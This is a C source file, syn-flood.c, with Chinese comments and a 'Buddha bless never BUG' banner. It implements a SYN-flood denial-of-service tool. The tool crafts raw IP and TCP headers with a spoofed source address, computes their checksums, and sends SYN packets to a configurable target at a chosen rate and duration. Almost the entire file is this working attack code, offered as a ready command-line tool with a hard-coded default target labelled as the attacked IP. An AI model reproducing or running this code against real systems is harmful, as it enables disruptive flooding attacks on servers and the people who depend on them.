/******************************************
FILE: 		syn-flood.c
author:		yaxinsn
version:		1

desception:   the raw of socket send IP TCP special packet.
			so this progam send tcp syn packet. so 

key function:	
			checksum
			parse_option
lib example:	getopt_long,socket.sendto.

                   _ooOoo_
                  o8888888o
                  88" . "88
                  (| -_- |)
                  O\  =  /O
               ____/`---'\____
             .'  \\|     |//  `.
            /  \\|||  :  |||//  \
           /  _||||| -:- |||||-  \
           |   | \\\  -  /// |   |
           | \_|  ''\---/''  |   |
           \  .-\__  `-`  ___/-. /
         ___`. .'  /--.--\  `. . __
      ."" '<  `.___\_<|>_/___.'  >'"".
     | | :  `- \`.;`\ _ /`;.`/ - ` : | |
     \  \ `-.   \_ __\ /__ _/   .-` /  /
======`-.____`-.___\_____/___.-`____.-'======
                   `=---='
          Buddha bless never BUG
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

******************************************/



#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <errno.h>
#include <string.h>
#include <sys/time.h>


#include <stdio.h> /* for printf */
#include <stdlib.h> /* for exit */
#include <getopt.h>
#include <unistd.h>

/* inet_addr */
#include <netinet/in.h>
#include <arpa/inet.h>


/**************************************************
			struct define
****************************************************/

typedef unsigned short  USHORT;
typedef unsigned char  UCHAR;
typedef struct _iphdr   /* 定义IP首部 */
{
  unsigned char h_verlen;   /*4位首部长度,4位IP版本号 */
  unsigned char tos;   //8位服务类型TOS
  unsigned short total_len; //16位总长度（字节）
  unsigned short ident;   //16位标识
  unsigned short frag_and_flags; //3位标志位
  unsigned char ttl;   //8位生存时间 TTL
  unsigned char proto;   //8位协议 (TCP, UDP 或其他)
  unsigned short checksum; //16位IP首部校验和
  unsigned int sourceIP;   //32位源IP地址
  unsigned int destIP;   //32位目的IP地址
}IP_HEADER;
struct     //定义TCP伪首部
{
  unsigned long saddr; //源地址
  unsigned long daddr; //目的地址
  char mbz;
  char ptcl;   //协议类型
  unsigned short tcpl; //TCP长度
}psd_header;
typedef struct _tcphdr   //定义TCP首部
{
	USHORT th_sport;   //16位源端口
	USHORT th_dport;   //16位目的端口
	unsigned int th_seq;   //32位序列号
	unsigned int th_ack;   //32位确认号
	unsigned char th_lenres; //4位首部长度/6位保留字
	unsigned char th_flag;   //6位标志位
	USHORT th_win;   //16位窗口大小
	USHORT th_sum;   //16位校验和
	USHORT th_urp;   //16位紧急数据偏移量
}TCP_HEADER;

/**************************************************
			Macro define
****************************************************/

#define SEQ 			0x28376839
#define SYN_DEST_IP	 	"192.168.100.1"	/*被攻击的IP */
#define FAKE_IP		 	"10.1.1.2" 
#define STATUS_FAILED 	0xFFFF /* 错误返回值 */


#define INVALID_SOCKET -1
#define  SOCKET_ERROR  -1

/**************************************************
			sub function declare
****************************************************/


/**************************************************
			sub function define
****************************************************/


/**************************************************
desc: 	count ip's head and tcp's body checksum
intput:  
		buffer: a some binary data
		size:  num of bytes
output:
	sum key
return:
****************************************************/

/* CheckSum:计算校验和的子函数 */
USHORT checksum(USHORT *buffer, int size) 
{ 
  unsigned long cksum=0;
  while(size >1) {
    cksum+=*buffer++;
    size -=sizeof(USHORT);
  }
  if(size ) {
    cksum += *(UCHAR*)buffer;
  }
  cksum = (cksum >> 16) + (cksum & 0xffff);
  cksum += (cksum >>16);
  return (USHORT)(~cksum);
}
int ExitProcess(int code)
{
  	exit(code);
}
struct synflood_config{
  	unsigned int 		sip;   //32位源IP地址
  	unsigned int 		dip;   //32位目的IP地址	
  	unsigned short 		dport;
	unsigned short 		sport;
	unsigned int 		multi_ip;
	unsigned int 		time;
	unsigned int 		freq;
};

/*  SynFlood主函数 */
int syn_flood(struct synflood_config* cfg )
{
  int datasize,flag;
  int err_code;
  struct timeval TimeOut={2000,0};
  int SendSEQ=0;
  char SendBuf[128]={0};
 // char RecvBuf[65535]={0};
  int i;
  int j;
  int sock_raw = 0;
  struct sockaddr_in DestAddr;
  IP_HEADER ip_header;
  TCP_HEADER tcp_header;
  
  sock_raw=socket(AF_INET,SOCK_RAW,IPPROTO_RAW);
  if (sock_raw==INVALID_SOCKET){
    fprintf(stderr,"WSASocket() failed: %d\n",errno);
    ExitProcess(STATUS_FAILED);
  }
  flag=1;
  //设置IP_HDRINCL以自己填充IP首部
  err_code=setsockopt(sock_raw,IPPROTO_IP,IP_HDRINCL,(char *)&flag,sizeof(int));
  if (err_code==SOCKET_ERROR)
     printf("Set IP_HDRINCL Error!\n");

  //设置发送超时
  err_code=setsockopt(sock_raw,SOL_SOCKET,SO_SNDTIMEO,(char*)&TimeOut,sizeof(TimeOut));
  if(err_code==SOCKET_ERROR){
    fprintf(stderr,"Failed to set send TimeOut: %d\n",errno);
    perror("setsockopt:");
    ExitProcess(STATUS_FAILED);
  }
  memset(&DestAddr,0,sizeof(DestAddr));
  DestAddr.sin_family=AF_INET;
 // DestAddr.sin_addr.s_addr=inet_addr(SYN_DEST_IP);
  DestAddr.sin_addr.s_addr= htonl(cfg->dip);

  //填充IP首部
  ip_header.h_verlen=(4<<4 | sizeof(ip_header)/sizeof(unsigned long));
  //高四位IP版本号，低四位首部长度
  ip_header.total_len=htons(sizeof(IP_HEADER)+sizeof(TCP_HEADER)); //16位总长度（字节）
  ip_header.ident=1;         					//16位标识
  ip_header.frag_and_flags=0;         //3位标志位
  ip_header.ttl=128;        				 //8位生存时间TTL
  ip_header.proto=IPPROTO_TCP;       //8位协议(TCP,UDP…)
  ip_header.checksum=0;        			 //16位IP首部校验和
  //ip_header.sourceIP=htonl(fake_ip_host+SendSEQ);     //32位源IP地址
  //ip_header.destIP=inet_addr(SYN_DEST_IP);     			//32位目的IP地址
  ip_header.sourceIP=htonl(cfg->sip);     //32位源IP地址
  ip_header.destIP=htonl(cfg->dip);     			//32位目的IP地址
  //填充TCP首部

  tcp_header.th_sport=htons(cfg->sport);       //源端口号
  tcp_header.th_dport=htons(cfg->dport);       //目的端口号
  tcp_header.th_seq=htonl(SEQ+SendSEQ);  //SYN序列号
  tcp_header.th_ack=0;         //ACK序列号置为0
  tcp_header.th_lenres=(sizeof(TCP_HEADER)/4<<4|0);     //TCP长度和保留位
  tcp_header.th_flag=2;         /* SYN 标志 */
  tcp_header.th_win=htons(16384);       /* 窗口大小 */
  tcp_header.th_urp=0;         //偏移
  tcp_header.th_sum=0;         //校验和
  /* 填充TCP伪首部（用于计算校验和，并不真正发送） */
  psd_header.saddr=ip_header.sourceIP;                         //源地址
  psd_header.daddr=ip_header.destIP;                         //目的地址
  psd_header.mbz=0;
  psd_header.ptcl=IPPROTO_TCP;                             //协议类型
  psd_header.tcpl=htons(sizeof(tcp_header));                     //TCP首部长度
  
  
  printf(". cfg->time %d\n",cfg->time);
  printf("* cfg->freq %d\n",cfg->freq);
  	
  for(i = 0; i < cfg->time; i++)
  {
 	printf(".");
  	for(j = 0; j < cfg->freq; j++)
  	{
		
		if(SendSEQ++==65536) 
			SendSEQ=1;       //序列号循环
		/* 更改IP首部 */
		ip_header.checksum=0;
		//ip_header.sourceIP=htonl(cfg->sip+(j+1)*(i+1));   //32位源IP地址
		ip_header.sourceIP=htonl(cfg->sip);   /* 32位源IP地址 */
		/* 更改TCP首部 */
		tcp_header.th_seq=htonl(SEQ+SendSEQ);     //SYN序列号
		tcp_header.th_sum=0;       //校验和
		//更改TCP Pseudo Header
		psd_header.saddr=ip_header.sourceIP;   
		/* 计算TCP校验和http://www.cwqq.org，计算校验和时需要包括TCP pseudo header    */
		memcpy(SendBuf,&psd_header,sizeof(psd_header)); 
		memcpy(SendBuf+sizeof(psd_header),&tcp_header,sizeof(tcp_header));
		tcp_header.th_sum=checksum((USHORT *)SendBuf,sizeof(psd_header)+sizeof(tcp_header));
		
		/* 计算IP校验和 */
		memcpy(SendBuf,&ip_header,sizeof(ip_header));
		memcpy(SendBuf+sizeof(ip_header),&tcp_header,sizeof(tcp_header));
		memset(SendBuf+sizeof(ip_header)+sizeof(tcp_header),0,4);
		datasize = sizeof(ip_header)+sizeof(tcp_header);
		ip_header.checksum=checksum((USHORT *)SendBuf,datasize);
		
		//填充发送缓冲区
		memcpy(SendBuf,&ip_header,sizeof(ip_header));
		//发送TCP报文
		err_code=sendto(sock_raw,SendBuf,datasize,0,(struct sockaddr*) &DestAddr, sizeof(DestAddr));
		if (err_code == SOCKET_ERROR)
			printf("\nSend Error:%d\n",errno);
		
		
		usleep(1000*1000/cfg->freq);
	}
  }//End of While

   close(sock_raw);
return 0;
}

void useage(void)
{
	printf("synflood --dip x.x.x.x --sip y.y.y.y --dport dport --sport sport  -t time -f freq \n"
		"default dport 8888 sport 9999 time 10 freq 100\n");
}


int parse_option(int argc, char **argv,struct synflood_config* cfg) 
{
	int c;
	//int digit_optind = 0;

	while (1)
	{
		//int this_option_optind = optind ? optind : 1;
		int option_index = 0;
		static struct option long_options[] = {
		{"dip", 1, 0, 0},
		{"sip", 1, 0, 0},
		{"dport", 1, 0, 0},
		{"sport", 1, 0, 0},
		{0, 0, 0, 0}
		};
		c = getopt_long (argc, argv, "t:f:h", long_options, &option_index);
		if (c == -1)
		break;
		
		switch (c) 
		{
			case 0:
			//printf ("option %s", long_options[option_index].name);
			if (optarg){
			//	printf (" with arg %s\n", optarg);
				switch (option_index)
				{
					case 0: //dip
						cfg->dip = inet_addr(optarg);
						cfg->dip = htonl(cfg->dip);
					break;
					case 1: //sip
						cfg->sip = inet_addr(optarg);
						cfg->sip = htonl(cfg->sip); //host endian
					break;
					case 2: //dport
						cfg->dport = atoi(optarg); //host endian
					break;
					case 3: //sport
						cfg->sport = atoi(optarg);
					break;
				}
			}
			break;
			
			case 't':
				cfg->time = atoi(optarg);
				//printf ("option t with value <%s> \n", optarg);
			break;
			case 'f':
				cfg->freq = atoi(optarg);
				//printf ("option f with value <%s> \n", optarg);
			break;
		case 'h':;
				useage();
				exit(0);
			break;				
			case '?':
				printf ("return option ? <%s> \n", optarg);
			break;
			
			default:
				printf (" getopt returned character code 0%o \n", c);
		}
	}

	if (optind < argc) 
	{
		printf ("non-option ARGV-elements: ");
		while (optind < argc)
		printf ("%s ", argv[optind++]);
		printf ("\n");
	}
	return 0;
}
int main(int argc,char** argv)
{
	struct synflood_config cfg;
	memset(&cfg,0,sizeof(cfg));
	cfg.dport = 8888;
	cfg.sport = 9999;
	cfg.dip  = inet_addr(SYN_DEST_IP);
	cfg.dip = htonl(cfg.dip);
	
	cfg.time = 10;
	cfg.freq = 100;
	cfg.sip  = inet_addr(FAKE_IP);
	cfg.sip = htonl(cfg.sip);
	
	parse_option(argc , argv, &cfg);
	
	syn_flood(&cfg);
	return 0;
}
